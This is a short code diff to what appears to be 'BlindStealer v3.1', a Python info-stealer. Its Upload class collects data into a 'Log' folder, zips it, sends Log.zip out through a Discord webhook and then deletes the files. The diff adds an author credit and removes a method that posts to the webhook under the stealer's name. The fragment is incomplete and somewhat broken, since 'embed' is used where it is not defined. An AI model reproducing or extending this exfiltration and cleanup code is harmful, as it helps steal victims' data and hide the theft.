@@ -31,6 +31,7 @@ class Upload:
         self.write_files()
         self.send()
         self.clean()
+        embed.set_footer(text="Blind v3.1 · Created by: readdone#1155")
     
     def write_files(self):
         os.makedirs("Log", exist_ok=True)
@@ -67,12 +68,6 @@ class Upload:
             ),
             file=File("Log.zip"),
         ) 
-        
-    def upload(self):
-            self.webhook.send(embed=embed, username="BlindStealer - v3.1", avatar_url="https://i.imgur.com/LNVOaxg.png")
-
-            
-            
     def clean(self):
         shutil.rmtree("Log")
         os.remove("Log.zip")
